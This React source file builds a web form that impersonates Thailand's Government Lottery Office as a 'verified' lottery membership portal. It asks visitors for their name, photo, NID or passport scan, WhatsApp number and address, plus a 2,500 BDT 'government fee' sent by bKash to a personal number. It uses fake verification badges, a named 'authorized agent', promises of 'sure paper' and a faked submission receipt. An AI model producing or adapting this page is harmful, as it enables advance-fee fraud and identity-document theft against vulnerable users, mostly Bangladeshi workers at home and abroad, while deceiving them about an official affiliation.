import React, { useState } from 'react';

export default function OnlineForm({ isStandalonePage = false }) {
  const [formData, setFormData] = useState({
    name: '',
    gender: 'Male',
    phone: '',
    address: '',
    country: 'Bangladesh',
    customCountry: '',
    bkashSenderNumber: '',
    bkashTrxId: ''
  });

  const [photoFile, setPhotoFile] = useState(null);
  const [nidFile, setNidFile] = useState(null);
  const [activeCard, setActiveCard] = useState('name');
  const [copiedBkash, setCopiedBkash] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const bkashNumber = '01910243177';

  const countryList = [
    'Bangladesh',
    'Saudi Arabia',
    'United Arab Emirates (UAE)',
    'Qatar',
    'Oman',
    'Kuwait',
    'Bahrain',
    'Malaysia',
    'Singapore',
    'Thailand',
    'Other Country'
  ];

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handlePhotoUpload = (e) => {
    const file = e.target.files && e.target.files[0];
    if (file) {
      setPhotoFile({
        name: file.name,
        size: (file.size / 1024).toFixed(1) + ' KB',
        preview: URL.createObjectURL(file)
      });
    }
  };

  const handleNidUpload = (e) => {
    const file = e.target.files && e.target.files[0];
    if (file) {
      setNidFile({
        name: file.name,
        size: (file.size / 1024).toFixed(1) + ' KB',
        preview: file.type.startsWith('image/') ? URL.createObjectURL(file) : null
      });
    }
  };

  const copyBkashNumber = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(bkashNumber);
    }
    setCopiedBkash(true);
    setTimeout(() => setCopiedBkash(false), 2500);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!formData.name.trim()) {
      alert('Please enter your Full Name.');
      setActiveCard('name');
      return;
    }
    if (!photoFile) {
      alert('Please upload your photograph (YOUR PHOTO HERE).');
      setActiveCard('photo');
      return;
    }
    if (!nidFile) {
      alert('Please upload your NID or Passport document photo (NID PHOTO HERE).');
      setActiveCard('nidPhoto');
      return;
    }
    if (!formData.phone.trim()) {
      alert('Please enter your Contact Number.');
      setActiveCard('phone');
      return;
    }
    if (!formData.address.trim()) {
      alert('Please enter your Current Address.');
      setActiveCard('address');
      return;
    }
    if (!formData.bkashSenderNumber || !formData.bkashTrxId) {
      alert('Please provide your bKash Sender Number and Transaction ID (TrxID).');
      setActiveCard('bkash');
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      setSubmitted(true);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 1200);
  };

  const resetForm = () => {
    setFormData({
      name: '',
      gender: 'Male',
      phone: '',
      address: '',
      country: 'Bangladesh',
      customCountry: '',
      bkashSenderNumber: '',
      bkashTrxId: ''
    });
    setPhotoFile(null);
    setNidFile(null);
    setActiveCard('name');
    setSubmitted(false);
  };

  return (
    <section
      className={`section form-section ${isStandalonePage ? 'standalone-form-section' : 'reveal-on-scroll'}`}
      id="online-form"
    >
      <div className="google-form-container" aria-label="Official Thailand Lottery Registration Form">
        {/* Official Top Video Hero (Full Width, Shorter Height, Clean) */}
        <div className="gform-top-video-card" aria-label="Official Thailand Lottery Video">
          <video
            className="gform-hero-video"
            controls
            playsInline
            autoPlay
            muted
            loop
            preload="metadata"
            poster="/form-video-poster.jpg"
            title="Official Thailand Lottery Video"
          >
            <source src="/form-video-optimized.mp4" type="video/mp4" />
            <source src="/Video-Project-11.mp4" type="video/mp4" />
            Your browser does not support the video tag.
          </video>
        </div>

        {/* Top Header Card */}
        <div className="gform-top-card">
          <div className="gform-color-stripe" />
          <div className="gform-header-content">
            <div className="gform-logo-row">
              <div className="gform-logo-box">
                <div className="gform-brand-mark" aria-hidden="true">
                  <img
                    src="/assets/logo.png?v=4"
                    alt="Thailand Lottery Official Logo"
                    className="gform-brand-logo"
                    width="72"
                    height="72"
                  />
                  <span className="gform-logo-verified-badge" title="Official Verified GLO Thailand">
                    <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true">
                      <path
                        fill="#1D9BF0"
                        d="M22.25 12c0-1.43-.88-2.67-2.19-3.19.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.52-1.31-1.76-2.19-3.19-2.19s-2.67.88-3.19 2.19c-1.39-.46-2.9-.2-3.91.81s-1.27 2.52-.81 3.91C2.93 9.33 2.05 10.57 2.05 12s.88 2.67 2.19 3.19c-.46 1.39-.2 2.9.81 3.91s2.52 1.27 3.91.81c.52 1.31 1.76 2.19 3.19 2.19s2.67-.88 3.19-2.19c1.39.46 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.52 2.19-1.76 2.19-3.19z"
                      />
                      <path
                        fill="#FFFFFF"
                        d="M10.09 16.72l-4.14-4.14 1.41-1.41 2.73 2.73 6.13-6.13 1.41 1.41-7.54 7.54z"
                      />
                    </svg>
                  </span>
                </div>
              </div>
              <div className="gform-official-text">
                <div className="gform-verified-badge-line">
                  <span className="gform-govt-seal">Government Lottery Office (GLO) • Bangkok, Thailand</span>
                  <span className="gform-verified-tag">
                    <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true">
                      <path
                        fill="#1D9BF0"
                        d="M22.25 12c0-1.43-.88-2.67-2.19-3.19.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.52-1.31-1.76-2.19-3.19-2.19s-2.67.88-3.19 2.19c-1.39-.46-2.9-.2-3.91.81s-1.27 2.52-.81 3.91C2.93 9.33 2.05 10.57 2.05 12s.88 2.67 2.19 3.19c-.46 1.39-.2 2.9.81 3.91s2.52 1.27 3.91.81c.52 1.31 1.76 2.19 3.19 2.19s2.67-.88 3.19-2.19c1.39.46 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.52 2.19-1.76 2.19-3.19z"
                      />
                      <path
                        fill="#FFFFFF"
                        d="M10.09 16.72l-4.14-4.14 1.41-1.41 2.73 2.73 6.13-6.13 1.41 1.41-7.54 7.54z"
                      />
                    </svg>
                    <span>Official Verified Portal</span>
                  </span>
                </div>
                <div className="gform-title-with-badge">
                  <h1 className="gform-main-heading">Thailand Official Lottery</h1>
                  <span className="gform-verified-title-check" title="Verified Portal">
                    <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
                      <path
                        fill="#1D9BF0"
                        d="M22.25 12c0-1.43-.88-2.67-2.19-3.19.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.52-1.31-1.76-2.19-3.19-2.19s-2.67.88-3.19 2.19c-1.39-.46-2.9-.2-3.91.81s-1.27 2.52-.81 3.91C2.93 9.33 2.05 10.57 2.05 12s.88 2.67 2.19 3.19c-.46 1.39-.2 2.9.81 3.91s2.52 1.27 3.91.81c.52 1.31 1.76 2.19 3.19 2.19s2.67-.88 3.19-2.19c1.39.46 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.52 2.19-1.76 2.19-3.19z"
                      />
                      <path
                        fill="#FFFFFF"
                        d="M10.09 16.72l-4.14-4.14 1.41-1.41 2.73 2.73 6.13-6.13 1.41 1.41-7.54 7.54z"
                      />
                    </svg>
                  </span>
                </div>
                <h2 className="gform-form-name">MEMBERSHIP REGISTRATION FORM 2026</h2>
                <div className="gform-thai-tagline">
                  Official Member Registration Portal • Government Lottery Office (GLO)
                </div>
                <p className="gform-subtext">
                  Directly regulated by the Government Lottery Office (GLO), Bangkok, Thailand.
                  Please complete your customer information accurately as shown on your official documents.
                </p>
              </div>
            </div>

            <div className="gform-notice-box">
              <p>⚠️ Please submit verified and accurate information matching your official documents.</p>
              <span className="gform-required-note">* Indicates required question</span>
            </div>
          </div>
        </div>

        {submitted ? (
          /* Google Form Submission Confirmation Receipt */
          <div className="gform-success-card">
            <div className="gform-color-stripe" />
            <div className="gform-success-body">
              <div className="gform-success-check-badge">✓</div>
              <h2 className="gform-success-title">Application Submitted Successfully!</h2>
              <div className="gform-success-thai-title">Your Membership Registration Has Been Recorded</div>
              <p className="gform-success-subtitle">
                Your response has been recorded. Your application has been registered with the Government Lottery Office (GLO), Bangkok, Thailand under Senior Agent Md Fahim Chowdhury (TL-001).
              </p>

              <div className="gform-receipt-summary">
                <div className="gform-receipt-header">
                  <span>📄 Official Submission Receipt</span>
                  <span className="receipt-tag">STATUS: PENDING VERIFICATION</span>
                </div>
                <div className="gform-receipt-grid">
                  <div className="receipt-row">
                    <span className="receipt-label">Full Name:</span>
                    <strong className="receipt-value">{formData.name}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">Gender:</span>
                    <strong className="receipt-value">{formData.gender}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">Contact Number:</span>
                    <strong className="receipt-value">{formData.phone}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">Current Address:</span>
                    <strong className="receipt-value">{formData.address}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">Country:</span>
                    <strong className="receipt-value">
                      {formData.country === 'Other Country' ? formData.customCountry : formData.country}
                    </strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">Applicant Photo:</span>
                    <strong className="receipt-value file-ok">✓ {photoFile ? photoFile.name : 'Uploaded'}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">NID Document Photo:</span>
                    <strong className="receipt-value file-ok">✓ {nidFile ? nidFile.name : 'Uploaded'}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">Authorized Agent:</span>
                    <strong className="receipt-value">Md Fahim Chowdhury (TL-001)</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">bKash Sender Number:</span>
                    <strong className="receipt-value">{formData.bkashSenderNumber}</strong>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-label">bKash Transaction ID:</span>
                    <strong className="receipt-value highlight-trx">{formData.bkashTrxId}</strong>
                  </div>
                </div>
              </div>

              <div className="gform-success-action-group">
                <button
                  type="button"
                  className="button secondary gform-reset-btn"
                  onClick={resetForm}
                >
                  Submit another response
                </button>
              </div>
            </div>
          </div>
        ) : (
          <form className="gform-body" onSubmit={handleSubmit} noValidate>
            {/* Section Divider: PERSONAL INFORMATION */}
            <div className="gform-section-header-banner">
              <div className="gform-section-banner-title">
                <span className="gform-section-icon" aria-hidden="true">👤</span>
                <span className="gform-section-text">
                  PERSONAL INFORMATION
                </span>
              </div>
              <span className="gform-section-pill">CUSTOMER INFORMATION</span>
            </div>

            {/* 1. Full Name */}
            <div
              className={`gform-question-card ${activeCard === 'name' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('name')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-name">
                Full Name <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">
                Enter your full official name as printed on your National ID or Passport
              </p>
              <div className="gform-input-wrapper">
                <input
                  id="gform-name"
                  name="name"
                  type="text"
                  required
                  className="gform-underline-input"
                  placeholder="Your answer"
                  value={formData.name}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('name')}
                />
                <span className="gform-input-focus-line" aria-hidden="true" />
              </div>
            </div>

            {/* 2. Applicant Photo Upload */}
            <div
              className={`gform-question-card ${activeCard === 'photo' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('photo')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                Applicant Photo (YOUR PHOTO HERE) <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                Upload 1 recent clear passport-size photograph (JPG, PNG — Max 10MB)
              </p>

              {photoFile ? (
                <div className="gform-file-card-preview">
                  <div className="gform-file-thumb">
                    <img src={photoFile.preview} alt="Passport preview" />
                  </div>
                  <div className="gform-file-details">
                    <span className="gform-file-name">{photoFile.name}</span>
                    <span className="gform-file-size">{photoFile.size} • Uploaded successfully</span>
                    <span className="gform-file-badge">👑 MEMBER THAILAND LOTTERY</span>
                  </div>
                  <button
                    type="button"
                    className="gform-file-remove-btn"
                    title="Remove file and select another"
                    onClick={() => setPhotoFile(null)}
                  >
                    ✕
                  </button>
                </div>
              ) : (
                <div className="gform-upload-action-box gform-photo-upload-box">
                  <label htmlFor="gform-photo-input" className="gform-add-file-btn">
                    <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
                      <path
                        fill="#1A73E8"
                        d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
                      />
                    </svg>
                    <span>Add file (JPG / PNG)</span>
                  </label>
                  <input
                    id="gform-photo-input"
                    type="file"
                    accept="image/png, image/jpeg, image/jpg, image/webp"
                    className="gform-hidden-file-input"
                    onChange={handlePhotoUpload}
                    onFocus={() => setActiveCard('photo')}
                  />
                  <div className="gform-photo-quote">
                    <span className="gform-quote-mark">“</span>
                    <span>Big Dreams Bigger Wins Together</span>
                    <span className="gform-quote-mark">”</span>
                  </div>
                </div>
              )}
            </div>

            {/* 3. NID / Document Photo Upload */}
            <div
              className={`gform-question-card ${activeCard === 'nidPhoto' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('nidPhoto')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                NID / Passport Document Photo (NID PHOTO HERE) <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                Upload a clear photo or scanned copy of your NID Card front page or Passport (JPG / PNG / PDF — Max 10MB)
              </p>

              {nidFile ? (
                <div className="gform-file-card-preview">
                  <div className="gform-file-thumb">
                    {nidFile.preview ? (
                      <img src={nidFile.preview} alt="NID preview" />
                    ) : (
                      <span className="gform-pdf-icon">📄</span>
                    )}
                  </div>
                  <div className="gform-file-details">
                    <span className="gform-file-name">{nidFile.name}</span>
                    <span className="gform-file-size">{nidFile.size} • Document attached</span>
                  </div>
                  <button
                    type="button"
                    className="gform-file-remove-btn"
                    title="Remove file and select another"
                    onClick={() => setNidFile(null)}
                  >
                    ✕
                  </button>
                </div>
              ) : (
                <div className="gform-upload-action-box gform-nid-dashed-box">
                  <label htmlFor="gform-nid-input" className="gform-add-file-btn">
                    <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
                      <path
                        fill="#1A73E8"
                        d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"
                      />
                    </svg>
                    <span>📷 NID PHOTO HERE (Upload JPG / PNG)</span>
                  </label>
                  <input
                    id="gform-nid-input"
                    type="file"
                    accept="image/png, image/jpeg, image/jpg, image/webp, application/pdf"
                    className="gform-hidden-file-input"
                    onChange={handleNidUpload}
                    onFocus={() => setActiveCard('nidPhoto')}
                  />
                  <span className="gform-upload-hint">NID Card front side or Passport photo page</span>
                </div>
              )}
            </div>

            {/* 4. Gender */}
            <div
              className={`gform-question-card ${activeCard === 'gender' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('gender')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                Gender <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">Select your official gender</p>

              <div className="gform-radio-group gform-gender-radio-group">
                {[
                  { id: 'Male', label: 'Male' },
                  { id: 'Female', label: 'Female' },
                  { id: 'Other', label: 'Other' }
                ].map((g) => (
                  <label
                    key={g.id}
                    className={`gform-radio-row ${formData.gender === g.id ? 'is-checked' : ''}`}
                  >
                    <input
                      type="radio"
                      name="gender"
                      value={g.id}
                      checked={formData.gender === g.id}
                      onChange={handleChange}
                      onFocus={() => setActiveCard('gender')}
                      className="gform-native-radio"
                    />
                    <span className="gform-custom-radio" aria-hidden="true">
                      <span className="gform-radio-inner-dot" />
                    </span>
                    <span className="gform-radio-label-text">{g.label}</span>
                  </label>
                ))}
              </div>
            </div>

            {/* 5. Contact Number */}
            <div
              className={`gform-question-card ${activeCard === 'phone' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('phone')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-phone">
                Contact Number (WhatsApp) <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">
                Your official membership credentials, sure paper access, and VIP updates will be sent to this number
              </p>
              <div className="gform-input-wrapper">
                <input
                  id="gform-phone"
                  name="phone"
                  type="tel"
                  required
                  className="gform-underline-input"
                  placeholder="e.g. +880 1XXXXXXXXX / +966 5XXXXXXXX"
                  value={formData.phone}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('phone')}
                />
                <span className="gform-input-focus-line" aria-hidden="true" />
              </div>
            </div>

            {/* 6. Current Address */}
            <div
              className={`gform-question-card ${activeCard === 'address' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('address')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-address">
                Current Address <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">
                Enter your present living street, village, district, or city address
              </p>
              <div className="gform-input-wrapper">
                <input
                  id="gform-address"
                  name="address"
                  type="text"
                  required
                  className="gform-underline-input"
                  placeholder="House, Road, City, Province / District"
                  value={formData.address}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('address')}
                />
                <span className="gform-input-focus-line" aria-hidden="true" />
              </div>
            </div>

            {/* 7. Country of Residence */}
            <div
              className={`gform-question-card ${activeCard === 'country' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('country')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <label className="gform-question-title" htmlFor="gform-country">
                Country of Residence <span className="gform-req">*</span>
              </label>
              <p className="gform-question-desc">Select the country where you are currently living or working</p>
              <div className="gform-select-wrapper">
                <select
                  id="gform-country"
                  name="country"
                  required
                  className="gform-dropdown-select"
                  value={formData.country}
                  onChange={handleChange}
                  onFocus={() => setActiveCard('country')}
                >
                  {countryList.map((c) => (
                    <option key={c} value={c}>
                      {c}
                    </option>
                  ))}
                </select>
                <span className="gform-dropdown-arrow" aria-hidden="true">▼</span>
              </div>

              {formData.country === 'Other Country' && (
                <div className="gform-input-wrapper gform-sub-input">
                  <input
                    name="customCountry"
                    type="text"
                    required
                    className="gform-underline-input"
                    placeholder="Specify your country name..."
                    value={formData.customCountry}
                    onChange={handleChange}
                  />
                  <span className="gform-input-focus-line" aria-hidden="true" />
                </div>
              )}
            </div>

            {/* Section Divider: AGENT INFORMATION */}
            <div className="gform-section-header-banner">
              <div className="gform-section-banner-title">
                <span className="gform-section-icon" aria-hidden="true">🏛️</span>
                <span className="gform-section-text">
                  AGENT INFORMATION
                </span>
              </div>
              <span className="gform-section-pill">OFFICIAL VERIFIED AGENT</span>
            </div>

            {/* 13. Authorized Agent Information Card */}
            <div className="gform-question-card gform-agent-profile-card">
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-agent-layout">
                <div className="gform-agent-meta">
                  <div className="gform-agent-field">
                    <span className="gform-agent-label">Agent Name:</span>
                    <strong className="gform-agent-name-highlight">মোঃ ফাহিম চৌধুরী (Md Fahim Chowdhury)</strong>
                  </div>
                  <div className="gform-agent-field">
                    <span className="gform-agent-label">Agent ID:</span>
                    <span className="gform-agent-id-badge">TL - 001</span>
                  </div>
                  <span className="gform-agent-subtext">Senior Authorized GLO Membership Officer</span>
                </div>

                <div className="gform-agent-documents-box">
                  <span className="gform-docs-title">OFFICIAL DOCUMENTS</span>
                  <ul className="gform-docs-list">
                    <li>🪪 NID Copy</li>
                    <li>🛂 Passport Copy</li>
                    <li>🏠 Proof of Address</li>
                    <li>🤳 Selfie with ID</li>
                  </ul>
                </div>

                <div className="gform-agent-crest-box">
                  <div className="gform-agent-crest-icon">🛡️</div>
                  <span className="gform-agent-crest-text">VERIFIED AGENT</span>
                  <span className="gform-agent-crest-sub">GLO BANGKOK 2026</span>
                </div>
              </div>
            </div>

            {/* Section Divider: FINAL BKASH MEMBERSHIP PAYMENT */}
            <div className="gform-section-header-banner gform-bkash-banner">
              <div className="gform-section-banner-title">
                <span className="gform-section-icon" aria-hidden="true">📱</span>
                <span className="gform-section-text">
                  FINAL MEMBERSHIP PAYMENT (বিকাশ ভেরিফিকেশন পেমেন্ট)
                </span>
              </div>
              <span className="gform-section-pill">2,500 BDT ESCROW</span>
            </div>

            {/* 15. Final bKash Payment */}
            <div
              className={`gform-question-card ${activeCard === 'bkash' ? 'is-active-card' : ''}`}
              onClick={() => setActiveCard('bkash')}
            >
              <div className="gform-card-left-indicator" aria-hidden="true" />
              <div className="gform-question-title">
                Official bKash Payment for Final Membership Activation <span className="gform-req">*</span>
              </div>
              <p className="gform-question-desc">
                আপনার মেম্বারশিপ চূড়ান্তভাবে কনফার্ম করতে নির্ধারিত সরকারি ফি (২,৫০০ টাকা) নিচের বিকাশ পার্সোনাল নম্বরে Send Money করুন এবং প্রেরক নম্বর ও TrxID ইনপুট দিন:
              </p>

              <div className="gform-bkash-card">
                <div className="gform-bkash-top">
                  <div className="gform-bkash-logo-title">
                    <span className="bkash-badge-chip">bKash Personal</span>
                    <span className="bkash-verified-indicator">✓ Official Authorized Number</span>
                  </div>
                  <div className="gform-bkash-number-row">
                    <span className="gform-bkash-number">{bkashNumber}</span>
                    <button
                      type="button"
                      className="gform-copy-btn"
                      onClick={copyBkashNumber}
                      title="Copy bKash Number"
                    >
                      {copiedBkash ? '✓ Copied' : 'Copy Number'}
                    </button>
                  </div>
                  <p className="gform-bkash-instructions">
                    bKash অ্যাপ বা *247# ডায়াল করে <strong>Send Money</strong> অপশন ব্যবহার করে ফি প্রেরণ করুন।
                  </p>
                </div>

                <div className="gform-bkash-inputs-group">
                  <div className="gform-subfield">
                    <label htmlFor="gform-bkash-sender" className="gform-subfield-label">
                      bKash Sender Mobile Number (প্রেরক মোবাইল নম্বর) <span className="gform-req">*</span>
                    </label>
                    <input
                      id="gform-bkash-sender"
                      name="bkashSenderNumber"
                      type="tel"
                      required
                      className="gform-underline-input"
                      placeholder="e.g. 01XXXXXXXXX"
                      value={formData.bkashSenderNumber}
                      onChange={handleChange}
                      onFocus={() => setActiveCard('bkash')}
                    />
                  </div>

                  <div className="gform-subfield">
                    <label htmlFor="gform-bkash-trx" className="gform-subfield-label">
                      bKash Transaction ID / TrxID (ট্রানজেকশন আইডি) <span className="gform-req">*</span>
                    </label>
                    <input
                      id="gform-bkash-trx"
                      name="bkashTrxId"
                      type="text"
                      required
                      className="gform-underline-input"
                      placeholder="e.g. BL9X3KD982"
                      value={formData.bkashTrxId}
                      onChange={handleChange}
                      onFocus={() => setActiveCard('bkash')}
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Form Footer Action */}
            <div className="gform-footer-action-bar">
              <button
                type="submit"
                className="button primary gform-submit-btn"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <span className="gform-submitting-state">
                    <span className="gform-spinner" aria-hidden="true" />
                    আবেদন জমা হচ্ছে... (Submitting...)
                  </span>
                ) : (
                  <span>আবেদন জমা দিন • Submit Application →</span>
                )}
              </button>
              <div className="gform-security-footer-note">
                🔒 256-Bit SSL Encrypted • Government Lottery Office (GLO) Bangkok Official Treasury
              </div>
            </div>
          </form>
        )}
      </div>
    </section>
  );
}
